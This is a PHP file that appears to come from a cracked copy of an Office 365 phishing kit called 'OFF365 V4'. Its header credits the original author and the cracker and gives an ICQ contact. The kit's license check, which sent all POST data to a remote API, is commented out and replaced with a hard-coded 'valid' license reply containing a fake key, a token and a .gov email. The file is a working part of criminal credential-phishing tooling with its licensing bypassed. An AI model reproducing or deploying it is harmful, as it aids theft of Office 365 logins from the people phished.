<?php
/* 
OFF365 V4 2020 by ExRobotos
CrackedBy: G66K
ICQ: @747246257

NOTE: Sorry ExRobotos, Your Page Was Easy TO Cracked.
*/
error_reporting(0);
include('config.php');
//$apiurl .= '?';
//foreach ($_POST as $a => $b) {
//    $apiurl .= urlencode($a) . '=' . urlencode($b) . '&';
//    var_dump($apiurl);
//}
//$ExRobotos = curl_init();
//curl_setopt($ExRobotos, CURLOPT_URL, $apiurl);
//curl_setopt($ExRobotos, CURLOPT_HEADER, 0);
//curl_setopt($ExRobotos, CURLOPT_RETURNTRANSFER, TRUE);
//$curlExec = curl_exec($ExRobotos);
//curl_close($ExRobotos);
//die(var_dump($curlExec));
echo '{
   "valid":"true",
   "rand": "19919",
   "token": "sakjqlkelkeqjlejqwe",
   "key":"CRACK-EDBY-G66K-GOV",
   "email":"david@shea.gov",
   "statos": "putuser"
}';
//echo $curlExec;
?>